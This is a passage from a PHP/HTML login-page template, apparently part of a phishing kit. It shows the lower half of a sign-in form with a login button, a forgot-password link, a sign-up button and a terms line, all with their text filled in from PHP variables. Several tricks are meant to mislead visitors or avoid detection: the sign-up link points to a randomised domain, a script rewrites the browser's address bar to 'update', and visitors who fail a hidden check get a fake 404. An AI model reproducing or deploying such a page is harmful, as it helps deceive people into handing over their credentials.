        <div class="col-xs-12 col-sm-6">
          <div class="checkbox">
            <label class="ng-binding">
              <input ng-model="form.remember" type="checkbox" name="remember" class="ng-pristine ng-untouched ng-valid ng-not-empty">
              <?php echo $Remem;?>
              <span class="control-indicator"></span>
            </label>
          </div>
        </div>
        <div class="col-xs-12 col-sm-6">
          <button dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-green ng-binding" id="login-button"><?php echo $togi;?></button>
        </div>
      </div>
    </form>

    <div class="row">
      <div class="col-xs-12 text-center">
        <p>
          <a class="ng-binding" href=""><?php echo $Forgpas;?></a>
        </p>
      </div>
    </div>

    <div id="sign-up-section">
      <div class="row">
        <div class="col-xs-12">
          <div class="ng-scope">
            <div class="ng-scope">
			<div class="ng-scope">
    <div class="row">
        <div class="col-xs-12">
            <div class="divider">
               
            </div>
        </div>
    </div>
    <div class="row text-center mt-0">
        <div class="h4 ng-binding"><?php echo $Dotha;?></div>
    </div>
    <div>
        <div class="row">
            <div class="col-xs-12">
                <a dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-default ng-binding" role="button" href="https://www.<?php echo $rand;?>.com"><?php echo $Signpfors;?></a>
            </div>
        </div>
    </div>
</div>

</div>
          </div>
        </div>
      </div>
    </div>


    <div class="row">
      <div class="col-xs-12">
        <div class="divider"></div>
        <p class="text-muted disclaimer text-center ng-binding" dir="<?php echo $semitic;?>" style="<?php echo $space;?>" ><?php echo $Ifyoucl;?> <a href="" target="_blank">Terms &amp; Conditions</a> and <a href="" target="_blank">Privacy Policy</a>.</p>
      </div>
    </div>
  </div>
</div>
</div>
<script>
window.history.pushState('<?php echo $bert;?>', '<?php echo $bert;?>', 'update');
</script>
<div></div></body>

</html>
<?php
}else {
header("HTTP/1.0 404 Not Found");	
}
?>